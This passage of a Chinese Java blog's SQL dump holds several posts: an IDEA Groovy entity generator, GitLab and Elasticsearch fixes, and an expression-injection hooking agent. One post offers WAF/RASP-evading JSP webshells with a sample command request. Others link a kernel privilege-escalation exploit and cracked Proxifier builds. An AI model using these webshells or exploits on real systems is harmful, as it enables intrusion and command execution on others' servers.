Java生成实体类代码有非常多的方案，而且强大的可以生成整个项目的解决方案，<span>不过这里只是讨论实体类的生成。</span>IDEA提供了类似的实体类生成脚本，用起来比较方便简捷。不过需要用IDEA支持的jvm脚本语言开发(默认示例是Clojure、Groovy)。\r\n</p>\r\n<p>\r\n	<span>但是自带的脚本简单到生成的代码都没法用(有bug)，</span>所以花了点时间完善了下脚本实现代码，这里简单介绍下如何使用我们的脚本去生成java实体类代码。\r\n</p>\r\n<p>\r\n	连接数据库:\r\n</p>\r\n<p>\r\n	<img src=\"http://p2j.cn/uploads/image/20170408/20170408155758_142.png\" alt=\"\" width=\"654\" height=\"662\" title=\"\" align=\"\" /> \r\n</p>\r\n<p>\r\n	配置数据库连接信息，<strong>如果没有下载过jdbc的jar，这里需要点击download</strong> \r\n</p>\r\n<p>\r\n	<img src=\"http://p2j.cn/uploads/image/20170408/20170408160245_325.png\" alt=\"\" width=\"758\" height=\"462\" title=\"\" align=\"\" /> \r\n</p>\r\n<p>\r\n	<br />\r\n</p>\r\n<p>\r\n	找到IDEA的脚本扩展目录：\r\n</p>\r\n<p>\r\n	<img src=\"http://p2j.cn/uploads/image/20170408/20170408160335_79.png\" alt=\"\" width=\"658\" height=\"1009\" title=\"\" align=\"\" /> \r\n</p>\r\n<p>\r\n	<br />\r\n</p>\r\n<p>\r\n	在这个脚本目录下<span>新建</span><span>Generate Entitys.groovy并</span><span>复制如下代码</span> \r\n</p>\r\n<p>\r\n	<span><img src=\"http://p2j.cn/uploads/image/20170408/20170408160550_197.png\" alt=\"\" width=\"558\" height=\"136\" title=\"\" align=\"\" /><br />\r\n</span> \r\n</p>\r\n<p>\r\n	<span><br />\r\n</span> \r\n</p>\r\n<p>\r\n	<span><span>Generate Entitys.groovy:</span></span> \r\n</p>\r\n<p>\r\n	<span> </span> \r\n</p>\r\n<pre class=\"brush: groovy; gutter: true\">import com.intellij.database.model.DasTable\r\nimport com.intellij.database.model.ObjectKind\r\nimport com.intellij.database.util.Case\r\nimport com.intellij.database.util.DasUtil\r\n\r\n/*\r\n * 默认可用的 context 绑定:\r\n *   SELECTION   Iterable*   PROJECT     project\r\n *   FILES       files helper\r\n */\r\n\r\npackageName = \"\"\r\ntypeMapping = [\r\n        (~/(?i)tinyint|smallint|mediumint/)      : \"Integer\",\r\n        (~/(?i)int/)                             : \"Long\",\r\n        (~/(?i)bool|bit/)                        : \"Boolean\",\r\n        (~/(?i)float|double|decimal|real/)       : \"Double\",\r\n        (~/(?i)datetime|timestamp|date|time/)    : \"Date\",\r\n        (~/(?i)blob|binary|bfile|clob|raw|image/): \"InputStream\",\r\n        (~/(?i)/)                                : \"String\"\r\n]\r\n\r\nFILES.chooseDirectoryAndSave(\"Choose directory\", \"Choose where to store generated files\") { dir -&gt;\r\n    SELECTION.filter { it instanceof DasTable &amp;&amp; it.getKind() == ObjectKind.TABLE }.each { generate(it, dir) }\r\n}\r\n\r\ndef generate(table, dir) {\r\n    def className = javaName(table.getName(), true)\r\n    def fields = calcFields(table)\r\n    packageName = getPackageName(dir)\r\n    new File(dir, className + \".java\").withPrintWriter { out -&gt; generate(out, className, fields) }\r\n}\r\n\r\n/**\r\n * 获取包名称\r\n * @param dir 实体类所在目录\r\n * @return\r\n */\r\ndef getPackageName(dir) {\r\n    return dir.toString().replaceAll(\"/\", \".\").replaceAll(\"^.*src(\\\\.main\\\\.java\\\\.)?\", \"\") + \";\"\r\n}\r\n\r\n/**\r\n * 实体类代码生成\r\n * @param out\r\n * @param className\r\n * @param fields\r\n * @return\r\n */\r\ndef generate(out, className, fields) {\r\n    out.println \"package $packageName\"\r\n    out.println \"\"\r\n\r\n    Settypes = new HashSet()\r\n\r\n    fields.each() {\r\n        types.add(it.type)\r\n    }\r\n\r\n    if (types.contains(\"Date\")) {\r\n        out.println \"import java.util.Date;\"\r\n    }\r\n\r\n    if (types.contains(\"InputStream\")) {\r\n        out.println \"import java.io.InputStream;\"\r\n    }\r\n\r\n    out.println \"\"\r\n    out.println \"public class $className {\"\r\n    fields.each() {\r\n        out.println \"\"\r\n        if (it.annos != \"\") out.println \"  ${it.annos}\"\r\n\r\n        // 输出注释\r\n        if (isNotEmpty(it.commoent)) {\r\n            out.println \"\\t/**\"\r\n            out.println \"\\t * ${it.commoent}\"\r\n            out.println \"\\t */\"\r\n        }\r\n\r\n        // 输出成员变量\r\n        out.println \"\\tprivate ${it.type} ${it.name};\"\r\n    }\r\n\r\n    // 输出get/set方法\r\n    fields.each() {\r\n        out.println \"\"\r\n\r\n        if (isNotEmpty(it.commoent)) {\r\n            out.println \"\\t/**\"\r\n            out.println \"\\t * 获取${it.commoent}\"\r\n            out.println \"\\t */\"\r\n        }\r\n\r\n        def actionName = \"Boolean\".equals(it.type.toString()) ? \"is\" : \"get\"\r\n\r\n        out.println \"\\tpublic ${it.type} ${actionName}${it.name.capitalize()}() {\"\r\n        out.println \"\\t\\treturn this.${it.name};\"\r\n        out.println \"\\t}\"\r\n        out.println \"\"\r\n\r\n        if (isNotEmpty(it.commoent)) {\r\n            out.println \"\\t/**\"\r\n            out.println \"\\t * 设置${it.commoent}\"\r\n            out.println \"\\t */\"\r\n        }\r\n        out.println \"\\tpublic void set${it.name.capitalize()}(${it.type} ${it.name}) {\"\r\n        out.println \"\\t\\tthis.${it.name} = ${it.name};\"\r\n        out.println \"\\t}\"\r\n    }\r\n    out.println \"\"\r\n    out.println \"}\"\r\n}\r\n\r\ndef calcFields(table) {\r\n    DasUtil.getColumns(table).reduce([]) { fields, col -&gt;\r\n        def spec = Case.LOWER.apply(col.getDataType().getSpecification())\r\n        def typeStr = typeMapping.find { p, t -&gt; p.matcher(spec).find() }.value\r\n        fields += [[\r\n                           colName : col.getName(),\r\n                           name    : javaName(col.getName(), false),\r\n                           type    : typeStr,\r\n                           commoent: col.getComment(),\r\n                           annos   : \"\"]]\r\n    }\r\n}\r\n\r\ndef javaName(str, capitalize) {\r\n    def s = str.split(/[^\\p{Alnum}]/).collect { def s = Case.LOWER.apply(it).capitalize() }.join(\"\")\r\n    capitalize ? s : Case.LOWER.apply(s[0]) + s[1..-1]\r\n}\r\n\r\ndef isNotEmpty(content) {\r\n    return content != null &amp;&amp; content.toString().trim().length() &gt; 0\r\n}</pre>\r\n<p>\r\n	<br />\r\n</p>\r\n<p>\r\n	测试代码生成:\r\n</p>\r\n<p>\r\n	<img src=\"http://p2j.cn/uploads/image/20170408/20170408160318_916.png\" alt=\"\" width=\"644\" height=\"814\" title=\"\" align=\"\" /> \r\n</p>\r\n<p>\r\n	<br />\r\n</p>\r\n<p>\r\n	选择实体层所在的目录：\r\n</p>\r\n<p>\r\n	<img src=\"http://p2j.cn/uploads/image/20170408/20170408161015_324.png\" alt=\"\" width=\"596\" height=\"376\" title=\"\" align=\"\" /> \r\n</p>\r\n<p>\r\n	<br />\r\n</p>\r\n<p>\r\n	最终生成的代码效果如图:\r\n</p>\r\n<p>\r\n	<img src=\"http://p2j.cn/uploads/image/20170408/20170408160852_336.png\" alt=\"\" width=\"716\" height=\"640\" title=\"\" align=\"\" /> \r\n</p>\r\n<p>\r\n	<br />\r\n</p>\r\n<p>\r\n	生成注释的前提是数据库字段已设置注释信息(comment)，否则无法生成。由于脚本写的比较简单，所以支持的数据类型有限。如代码中的typeMapping可自行添加。对于boolean类型的数据类型支持不够友好因为每个数据库的实现差异比较大，不过bool之类的可以直接翻译。\r\n</p>\r\n<p>\r\n	插件代码下载地址: <a class=\"ke-insertfile\" href=\"/uploads/file/20170408/20170408161315_891.groovy\" target=\"_blank\">Generate Entitys.groovy</a> \r\n</p>\r\n<p>\r\n	<br />\r\n</p>', null, '2017-04-08 16:18:15', '1', '1609', '', '6', '2017-04-08 16:18:15'), ('1857', '1', '9', 'gitlab迁移遇到的版本不一致和无法导入问题', '园长', '<p>\r\n	<strong>Gitlab恢复数据时提示备份版本和当前版本不匹配时无法导入？</strong> \r\n</p>\r\n<p>\r\n	这个时候需要卸载掉当前服务器安装的gitlab版本，并下载备份时的gitlab版本并重新安装(清华的tuna项目有所有的gitlab版本备份，下载地址:https://mirrors.tuna.tsinghua.edu.cn/gitlab-ce/yum/)\r\n</p>\r\n<p>\r\n	这里需要根据当前的操作系统类型选择e16或者e17，（centos 64bit是e16,centos7是 e17。如果不清楚具体是什么执行uname -a就知道了)。\r\n</p>\r\n<p>\r\n	下载完对应版本的rpm包后直接安装并再次导入备份文件即可。\r\n</p>\r\n<p>\r\n	<br />\r\n</p>\r\n<p>\r\n	<strong>\"</strong><strong>gitlab undefined method `full_path\'</strong><strong>\"</strong> \r\n</p>\r\n<p>\r\n	遇到这个问题是因为数据库里有一个未删除的仓库记录而备份文件中并不存在此仓库，这时候直接注释掉：/opt/gitlab/embedded/service/gitlab-rails/lib/backup/repository.rb文件的78行:\r\n</p>\r\n<pre class=\"brush: ruby; gutter: true\">#project.ensure_storage_path_exists</pre>\r\n<p>\r\n	然后执行:\r\n</p>\r\n<pre class=\"brush: bash; gutter: true\">gitlab-ctl reconfigure\r\ngitlab-ctl restart\r\ngitlab-rake gitlab:backup:restore BACKUP=XXXXXX</pre>\r\n<p>\r\n	等待命令执行完成即可成功恢复数据了。\r\n</p>', null, '2017-11-06 06:38:18', '1', '843', '', '0', '2017-11-06 06:38:18'), ('1858', '1', '10', 'Proxifier Mac和Windows全局代理', '园长', '<p>\r\n	有很多时候我们利用<span>ShadowsocksX或者SSH隧道打开代理后发现Mac和windows都无法全流量代理。</span>Proxifier<span>只需要简单的配置就可以</span>支持全局的流量代理。\r\n</p>\r\n<p>\r\n	首先需要利用SSH隧道或者ShadowsocksX先在本地开发一个Socket代理(监听一个用于本机代理的socket端口)。\r\n</p>\r\n<p>\r\n	<strong>Mac版本配置</strong> \r\n</p>\r\n<p>\r\n	<strong> </strong>如果要使用mac下的ssh代理隧道，在控制台执行如下命令:ssh -nNTf -D 1080 root@123.123.123.123 (<span>123.123.123.123是你的远程linux服务器地址</span>)。如果用<span>ShadowsocksX直接配置好ss服务器代理就可以了。</span> \r\n</p>\r\n<p>\r\n	<strong> </strong><span>点击Proxies添加一个Socket5代理，如图：</span> \r\n</p>\r\n<p>\r\n	<img src=\"http://p2j.cn/uploads/image/20171106/20171106082749_947.png\" alt=\"\" width=\"600\" height=\"524\" title=\"\" align=\"\" /> \r\n</p>\r\n<p>\r\n	<br />\r\n</p>\r\n<p>\r\n	设置代理规则(Applications可以选择你想要代理的应用，默认是任何的mac应用):\r\n</p>\r\n<p>\r\n	<img src=\"http://p2j.cn/uploads/image/20171106/20171106082811_28.png\" alt=\"\" width=\"600\" height=\"337\" title=\"\" align=\"\" /> \r\n</p>\r\n<p>\r\n	action选择前面配置好的Socket5代理。\r\n</p>\r\n<p>\r\n	<br />\r\n</p>\r\n<p>\r\n	<strong>Windows版本</strong> \r\n</p>\r\n<p>\r\n	Windows版本配置过于简单，启动好<span>ShadowsocksX或者ssh代理后</span>直接添加代理就可以了。\r\n</p>\r\n<p>\r\n	<img src=\"http://p2j.cn/uploads/image/20171106/20171106083644_80.png\" alt=\"\" width=\"600\" height=\"334\" title=\"\" align=\"\" /> \r\n</p>\r\n<p>\r\n	<br />\r\n</p>\r\n<p>\r\n	Mac版:<a class=\"ke-insertfile\" href=\"/uploads/file/20171106/20171106081830_237.dmg\" target=\"_blank\">Proxifier+for+Mac+2.15.3.dmg</a>&nbsp;(安装密码www.ifunmac.com)\r\n</p>\r\n<p>\r\n	Windows汉化版:<a class=\"ke-insertfile\" href=\"/uploads/file/20171106/20171106081934_107.rar\" target=\"_blank\">HA-Proxifier331-LDR.rar</a> \r\n</p>', null, '2017-11-06 08:20:13', '1', '1321', '', '9', '2017-11-06 08:20:13'), ('1859', '1', '32', 'Elasticsearch The number of object passed must be even but was [1]', '园长', '<p>\n	新版的elasticsearch 在调用setSource的时候传入json字符串、对象后都会爆:The number of object passed must be even but was [1].其实是新版需要传入Map类型。\n</p>\n<p>\n	<strong>使用fastjson转换成Map对象</strong> \n</p>\n<pre class=\"brush: java; gutter: true\">Map data = JSONObject.parseObject((String) doc.get(\"json\"), Map.class);</string,></pre>\n<p>\n	<strong>使用自带的XContentParser</strong> \n</p>\n<pre class=\"brush: java; gutter: true\">XContentParser parser = XContentFactory.xContent(XContentType.JSON). createParser(NamedXContentRegistry.EMPTY, json);</pre>\n<p>\n	然后在<span>setSource时转换成Map类型: </span>.setSource(parser.map())\n</p>', null, '2017-12-11 05:53:54', '1', '1417', '', '1', '2017-12-11 05:53:54'), ('1860', '1', '10', 'AB在线Markdown编辑器', '园长', '<strong>Git地址:</strong><strong><a href=\"https://github.com/anbai-inc/ab-editor\" target=\"_blank\">https://github.com/anbai-inc/ab-editor</a></strong>\r\n<h2 style=\"color:#24292E;font-family:-apple-system, system-ui,;\">\r\n	简介\r\n</h2>\r\n<p style=\"color:#24292E;font-family:-apple-system, system-ui, \" font-size:16px;\"=\"\">\r\n	这是一个简单的Markdown在线编辑器,演示项目环境是一个SpringBoot+JPA的maven项目，clone后请修改数据库密码。项目比较简单，调用请参考示例editor.html。前端代码依赖主要markdown-it.js jquery、codemirror、jquery-file-upload。&nbsp;\r\n	</p>\r\n<p style=\"color:#24292E;font-family:-apple-system, system-ui, \" font-size:16px;\"=\"\"><img src=\"http://p2j.cn/uploads/image/20180116/20180116021838_335.png\" alt=\"\" />\r\n</p>\r\n<p style=\"color:#24292E;font-family:-apple-system, system-ui, \" font-size:16px;\"=\"\">\r\n	支持表情包和文件上传(表情包支持自定义表情分组、图片、描述之类的)。&nbsp;\r\n	</p>\r\n<p style=\"color:#24292E;font-family:-apple-system, system-ui, \" font-size:16px;\"=\"\"><img src=\"http://p2j.cn/uploads/image/20180116/20180116021849_133.png\" alt=\"\" />\r\n</p>\r\n<h2 style=\"color:#24292E;font-family:-apple-system, system-ui,;\">\r\n	<a href=\"https://github.com/anbai-inc/ab-editor#%E5%9F%BA%E6%9C%AC%E9%85%8D%E7%BD%AE\" class=\"anchor\" id=\"user-content-基本配置\"></a>基本配置\r\n</h2>\r\n<p style=\"color:#24292E;font-family:-apple-system, system-ui, \" font-size:16px;\"=\"\">\r\n	创建编辑器时可以指定表情包、文件上传的API地址:\r\n	</p>\r\n<pre class=\"brush: javascript; gutter: true\">var editor = $(\'#ab_editor_demo\').ABEditor({\r\n    \"url\": \"./api/ab-editor/upload_json.php\",\r\n    \"emoji_api\": \"./api/ab-editor/emoji.php\",\r\n    \"height\": 400\r\n});\r\n</pre>\r\n当然也可以通过height和width指定编辑器的宽高。\r\n	<p>\r\n		<br />\r\n	</p>\r\n<p style=\"color:#24292E;font-family:-apple-system, system-ui, \" font-size:16px;\"=\"\">\r\n	获取编辑器值方式:editor.getValue()\r\n</p>\r\n<p style=\"color:#24292E;font-family:-apple-system, system-ui, \" font-size:16px;\"=\"\">\r\n	HTML渲染markdown方式:\r\n	</p>\r\n<div class=\"highlight highlight-source-js\" style=\"color:#24292E;font-family:-apple-system, system-ui, \" font-size:16px;\"=\"\">\r\n<pre class=\"brush: actionscript3; gutter: true\">var md = markdownit({\r\n    html: false\r\n});\r\n\r\n// 获取渲染后的html代码片段\r\nvar html = md.render(content);\r\n</pre>\r\n		</div>\r\n<p style=\"color:#24292E;font-family:-apple-system, system-ui, \" font-size:16px;\"=\"\">\r\n	其他的配置详情见代码。\r\n			</p>\r\n			<h2 style=\"color:#24292E;font-family:-apple-system, system-ui,;\">\r\n				<a href=\"https://github.com/anbai-inc/ab-editor#notice\" class=\"anchor\" id=\"user-content-notice\"></a>Notice\r\n			</h2>\r\n<p style=\"color:#24292E;font-family:-apple-system, system-ui, \" font-size:16px;\"=\"\">\r\n	编辑器图标用的<a href=\"https://hacpai.com/\">hacpai</a>编辑器的svg。\r\n		</p>', null, '2018-01-12 06:26:25', '1', '892', '', '2', '2018-01-12 06:26:25'), ('1861', '1', '9', 'CVE-2017-16995 Ubuntu 16.04 提权', '园长', '<p>\r\n	https://people.canonical.com/~ubuntu-security/cve/2017/CVE-2017-16995.html\r\n</p>\r\n<p>\r\n	<br />\r\n</p>\r\n<p>\r\n	<img src=\"http://p2j.cn/uploads/image/20180316/20180316094115_11.jpg\" alt=\"\" width=\"600\" height=\"326\" title=\"\" align=\"\" />\r\n</p>\r\n<p>\r\n	<br />\r\n</p>\r\n<p>\r\n	<img src=\"http://p2j.cn/uploads/image/20180316/20180316094140_157.jpg\" alt=\"\" width=\"400\" height=\"131\" title=\"\" align=\"\" />\r\n</p>\r\n<p>\r\n	<a class=\"ke-insertfile\" href=\"/uploads/file/20180316/20180316094012_773.c\" target=\"_blank\">Ubuntu 16.04.4 kernel_priv.c</a> \r\n</p>', null, '2018-03-16 09:43:51', '1', '1913', '', '1', '2018-03-16 09:43:51'), ('1862', '1', '3', 'Java SpEL、Ognl、MVEL2表达式Hook项目', '园长', '<p style=\"color:#24292E;font-family:-apple-system, system-ui, \" font-size:16px;\"=\"\">\r\n	最近Spring连续两个命令执行，SpEL表达式在Spring的子项目中大量的使用甚至是滥用让人感觉不到安全。昨天写了一个Hook并记录Java表达式语言的项目，可用于观测命令和执行点调用链信息。适当的改改可以直接用于拦截未知的表达式注入漏洞攻击。\r\n	</p>\r\n<p style=\"color:#24292E;font-family:-apple-system, system-ui, \" font-size:16px;\"=\"\">\r\n	git地址：<a class=\"ke-insertfile\" href=\"https://github.com/anbai-inc/javaweb-expression\" target=\"_blank\">https://github.com/anbai-inc/javaweb-expression</a> \r\n</p>\r\n<p style=\"color:#24292E;font-family:-apple-system, system-ui, \" font-size:16px;\"=\"\">\r\n	这是一个专门Hook并记录Java表达式语言执行的Agent小程序。逻辑非常简单，适合初学者使用。所有的实现代码逻辑都在:<a class=\"ke-insertfile\" href=\"https://github.com/anbai-inc/javaweb-expression/blob/master/expression-agent/src/main/java/org/javaweb/expression/Agent.java\" target=\"_blank\">org.javaweb.expression.Agent.java</a>类里面。导入javaweb-expression并构建expression-agent模块。然后在程序运行之前加入以下jvm参数:\r\n	</p>\r\n<pre class=\"brush: java; gutter: true\">-noverify -javaagent:/目标路径/expression-agent.jar -Dfile.encoding=UTF-8</pre>\r\n<p style=\"color:#24292E;font-family:-apple-system, system-ui, \" font-size:16px;\"=\"\">\r\n	如果是Tomcat需要修改catalina.sh或者catalina.bat文件,添加如下配置参数:JAVA_OPTS=\"-noverify -javaagent:/目标路径/expression-agent.jar&nbsp;成功插入后控制台(可以根据具体的情况输出到文件或者数据库)会打印出拦截到的表达式和程序调用链。\r\n</p>\r\n<p style=\"color:#24292E;font-family:-apple-system, system-ui, \" font-size:16px;\"=\"\">\r\n	如:\r\n	</p>\r\n<pre>---------------------------------EXP-----------------------------------------\r\n3-1\r\n---------------------------------调用链---------------------------------------\r\njava.lang.Thread.getStackTrace(Thread.java:1559)\r\norg.javaweb.expression.Agent.expression(Agent.java:179)\r\norg.springframework.expression.spel.standard.SpelExpression.(SpelExpression.java)\r\norg.springframework.expression.spel.standard.InternalSpelExpressionParser.doParseExpression(InternalSpelExpressionParser.java:139)\r\norg.springframework.expression.spel.standard.SpelExpressionParser.doParseExpression(SpelExpressionParser.java:61)\r\norg.springframework.expression.spel.standard.SpelExpressionParser.doParseExpression(SpelExpressionParser.java:33)\r\norg.springframework.expression.common.TemplateAwareExpressionParser.parseExpression(TemplateAwareExpressionParser.java:52)\r\norg.springframework.expression.common.TemplateAwareExpressionParser.parseExpression(TemplateAwareExpressionParser.java:43)\r\norg.javaweb.exp.controller.IndexController.spel(IndexController.java:37)\r\nsun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)\r\nsun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62)\r\nsun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)\r\njava.lang.reflect.Method.invoke(Method.java:498)\r\norg.springframework.web.method.support.InvocableHandlerMethod.doInvoke(InvocableHandlerMethod.java:209)\r\norg.springframework.web.method.support.InvocableHandlerMethod.invokeForRequest(InvocableHandlerMethod.java:136)\r\norg.springframework.web.servlet.mvc.method.annotation.ServletInvocableHandlerMethod.invokeAndHandle(ServletInvocableHandlerMethod.java:102)\r\norg.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerAdapter.invokeHandlerMethod(RequestMappingHandlerAdapter.java:877)\r\norg.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerAdapter.handleInternal(RequestMappingHandlerAdapter.java:783)\r\norg.springframework.web.servlet.mvc.method.AbstractHandlerMethodAdapter.handle(AbstractHandlerMethodAdapter.java:87)\r\norg.springframework.web.servlet.DispatcherServlet.doDispatch(DispatcherServlet.java:991)\r\norg.springframework.web.servlet.DispatcherServlet.doService(DispatcherServlet.java:925)\r\norg.springframework.web.servlet.FrameworkServlet.processRequest(FrameworkServlet.java:974)\r\norg.springframework.web.servlet.FrameworkServlet.doGet(FrameworkServlet.java:866)\r\njavax.servlet.http.HttpServlet.service(HttpServlet.java:635)\r\norg.springframework.web.servlet.FrameworkServlet.service(FrameworkServlet.java:851)\r\njavax.servlet.http.HttpServlet.service(HttpServlet.java:742)\r\norg.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:231)\r\norg.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166)\r\norg.apache.tomcat.websocket.server.WsFilter.doFilter(WsFilter.java:52)\r\norg.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193)\r\norg.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166)\r\norg.springframework.web.filter.RequestContextFilter.doFilterInternal(RequestContextFilter.java:99)\r\norg.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:107)\r\norg.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193)\r\norg.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166)\r\norg.springframework.web.filter.HttpPutFormContentFilter.doFilterInternal(HttpPutFormContentFilter.java:109)\r\norg.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:107)\r\norg.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193)\r\norg.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166)\r\norg.springframework.web.filter.HiddenHttpMethodFilter.doFilterInternal(HiddenHttpMethodFilter.java:81)\r\norg.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:107)\r\norg.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193)\r\norg.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166)\r\norg.springframework.boot.web.servlet.support.ErrorPageFilter.doFilter(ErrorPageFilter.java:117)\r\norg.springframework.boot.web.servlet.support.ErrorPageFilter.access$000(ErrorPageFilter.java:61)\r\norg.springframework.boot.web.servlet.support.ErrorPageFilter$1.doFilterInternal(ErrorPageFilter.java:92)\r\norg.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:107)\r\norg.springframework.boot.web.servlet.support.ErrorPageFilter.doFilter(ErrorPageFilter.java:110)\r\norg.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193)\r\norg.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166)\r\norg.springframework.web.filter.CharacterEncodingFilter.doFilterInternal(CharacterEncodingFilter.java:200)\r\norg.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:107)\r\norg.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193)\r\norg.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166)\r\norg.apache.catalina.core.StandardWrapperValve.invoke(StandardWrapperValve.java:199)\r\norg.apache.catalina.core.StandardContextValve.invoke(StandardContextValve.java:96)\r\norg.apache.catalina.authenticator.AuthenticatorBase.invoke(AuthenticatorBase.java:478)\r\norg.apache.catalina.core.StandardHostValve.invoke(StandardHostValve.java:140)\r\norg.apache.catalina.valves.ErrorReportValve.invoke(ErrorReportValve.java:81)\r\norg.apache.catalina.valves.AbstractAccessLogValve.invoke(AbstractAccessLogValve.java:650)\r\norg.apache.catalina.core.StandardEngineValve.invoke(StandardEngineValve.java:87)\r\norg.apache.catalina.connector.CoyoteAdapter.service(CoyoteAdapter.java:342)\r\norg.apache.coyote.http11.Http11Processor.service(Http11Processor.java:803)\r\norg.apache.coyote.AbstractProcessorLight.process(AbstractProcessorLight.java:66)\r\norg.apache.coyote.AbstractProtocol$ConnectionHandler.process(AbstractProtocol.java:868)\r\norg.apache.tomcat.util.net.NioEndpoint$SocketProcessor.doRun(NioEndpoint.java:1459)\r\norg.apache.tomcat.util.net.SocketProcessorBase.run(SocketProcessorBase.java:49)\r\njava.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1149)\r\njava.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624)\r\norg.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:61)\r\njava.lang.Thread.run(Thread.java:748)\r\n--------------------------------------------------------------------------</pre>\r\n<p style=\"color:#24292E;font-family:-apple-system, system-ui, \" font-size:16px;\"=\"\">\r\n	javaweb-exp是一个包含集中表达式执行点的测试项目,可以直接部署到tomcat就行测试。\r\n</p>', null, '2018-04-13 08:09:56', '1', '1136', '', '2', '2018-04-13 08:09:56'), ('1863', '1', '12', '一个绕Runtime、ProcessBuilder的linux-cmd.jsp', '园长', '<p>\r\n	最近有人问怎么绕过ProcessBuilder的exec方法,所以就写了一个可以绕大部分WAF或者说RASP的jsp。原理很简单:直接反射java.lang.UNIXProcess类。\r\n</p>\r\n<p>\r\n	请求:<a href=\"http://localhost:8080/linux-cmd.jsp?str=ls -la\" target=\"_blank\">http://localhost:8080/linux-cmd.jsp?str=ls -la</a> \r\n</p>\r\n<p>\r\n	Windows版懒得写，会的朋友自己动手稍微改下就可以了。\r\n</p>\r\n<p>\r\n	下载地址:<a class=\"ke-insertfile\" href=\"/uploads/file/20180508/20180508075245_212.zip\" target=\"_blank\">linux-cmd.jsp.zip</a> \r\n</p>\r\n<p>\r\n	<br />\r\n</p>\r\n<p>\r\n	再发一个纯Java反射ProcessBuilder类的cmd.jspx,下载地址:<a href=\"http://javaweb.org/uploads/file/20180502/20180502014842_62.zip\" target=\"_blank\">cmd.jspx</a>\r\n</p>', null, '2018-05-08 07:57:18', '1', '1495', '', '9', '2018-05-08 07:57:18'), ('1866', '1', '28', 'Mac IDEA+CLION jni Hello World', '园长', '<!--?xml version=\"1.0\" encoding=\"UTF-8\"?-->\r\n<p>\r\n	新建一个空的javaweb-jni项目，并在IDEA添加拓展工具:\r\n</p>\r\n<p>\r\n	<img src=\"http://p2j.cn/uploads/image/20180523/20180523075652_579.png\" alt=\"\" width=\"600\" height=\"404\" title=\"\" align=\"\" /> \r\n</p>\r\n<p>\r\n	<br />\r\n</p>\r\n<p>\r\n	<!--?xml version=\"1.0\" encoding=\"UTF-8\"?-->\r\n添加拓展工具:\r\n</p>\r\n<p>\r\n	<!--?xml version=\"1.0\" encoding=\"UTF-8\"?-->\r\n</p>\r\n<div>\r\n	Program: $JDKPath$/bin/javah\r\n</div>\r\n<div>\r\n	Arguments: -jni -classpath $OutputPath$ -d ./jni/ $FileClass$\r\n</div>\r\n<div>\r\n	Working directory: $ProjectFileDir$&nbsp;\r\n</div>\r\n<img src=\"http://p2j.cn/uploads/image/20180523/20180523075802_689.png\" alt=\"\" width=\"600\" height=\"405\" title=\"\" align=\"\" /> \r\n<p>\r\n	<br />\r\n</p>\r\n<p>\r\n	新建<strong>org.javaweb.jni.Test.java</strong>:\r\n</p>\r\n<pre class=\"brush: java; gutter: true\">package org.javaweb.jni;\r\n\r\npublic class Test {\r\n\r\n   static {\r\n        System.loadLibrary(\"test\");\r\n   }\r\n\r\n   private static native String exec(String cmd);\r\n\r\n   public static void main(String[] args) {\r\n        System.out.println(exec(\"123\"));\r\n   }\r\n\r\n}</pre>\r\n<!--?xml version=\"1.0\" encoding=\"UTF-8\"?-->\r\n生成JNI头文件测试:\r\n<p>\r\n	<img src=\"http://p2j.cn/uploads/image/20180523/20180523075948_992.png\" alt=\"\" width=\"600\" height=\"371\" title=\"\" align=\"\" /> \r\n</p>\r\n<p>\r\n	<!--?xml version=\"1.0\" encoding=\"UTF-8\"?-->\r\n成功生成的头文件会存放在当前项目根目录下创建jni目录:\r\n</p>\r\n<p>\r\n	<img src=\"http://p2j.cn/uploads/image/20180523/20180523080022_278.png\" alt=\"\" width=\"340\" height=\"238\" title=\"\" align=\"\" /> \r\n</p>\r\n<p>\r\n	<!--?xml version=\"1.0\" encoding=\"UTF-8\"?-->\r\nClion新建C项目:\r\n</p>\r\n<p>\r\n	<img src=\"http://p2j.cn/uploads/image/20180523/20180523080055_220.png\" alt=\"\" width=\"600\" height=\"372\" title=\"\" align=\"\" /> \r\n</p>\r\n<p>\r\n	<!--?xml version=\"1.0\" encoding=\"UTF-8\"?-->\r\n</p>\r\n<div>\r\n	复制jni.h和jni_md.h到Clion项目目录(jdk1.8.0_144.jdk换成本地的JDK版本):\r\n</div>\r\n<div>\r\n	<br />\r\n</div>\r\n<div>\r\n	cd /Library/Java/JavaVirtualMachines/jdk1.8.0_144.jdk/Contents/Home/\r\n</div>\r\n<div>\r\n	cp include/jni.h include/darwin/jni_md.h /Users/yz/CLionProjects/javaweb-jni\r\n</div>\r\n<div>\r\n	<br />\r\n</div>\r\n<div>\r\n	复制idea中的<strong>org_javaweb_jni_Test.h</strong>到Clion目录修改<strong>#include 